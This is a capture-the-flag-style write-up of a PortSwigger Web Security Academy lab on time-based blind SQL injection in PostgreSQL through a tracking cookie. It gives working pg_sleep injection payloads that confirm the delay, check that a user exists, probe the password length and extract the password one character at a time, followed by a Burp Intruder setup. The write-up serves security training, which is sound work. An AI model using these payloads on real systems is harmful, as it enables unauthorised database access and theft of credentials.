# Lab 14 — Blind SQL injection with time delays and information retrieval

> **Practitioner** · [Official lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

**Entry point:** `TrackingId` cookie · **DB:** PostgreSQL

## Goal

Extract the `administrator` password by converting query results into
**conditional time delays** (slow response = condition true).

## Solution

1. Confirm the delay primitive:

```
xyz'||pg_sleep(10)--
```

2. Make the delay conditional on data existing in `users`:

```
xyz'||(SELECT pg_sleep(10) FROM users WHERE username='administrator')--
```

→ ~10 s delay proves the user exists.

3. Find the password length (increase until no delay — it is 20 chars):

```
xyz'||(SELECT CASE WHEN (LENGTH(password)>19) THEN pg_sleep(10)
      ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

4. Extract character by character — payload template:

```
xyz'||(SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§')
      THEN pg_sleep(10) ELSE pg_sleep(0) END
      FROM users WHERE username='administrator')--
```

5. Burp Intruder → **Cluster bomb** over position (1–20) and charset
   (`a-z0-9`). Sort results by **response time** — the slow request for
   each position reveals its character.

6. Log in as `administrator` — lab solved.

## Notes

Time-based extraction is the slowest channel; keep threads low, since
overlapping sleeps distort timings.
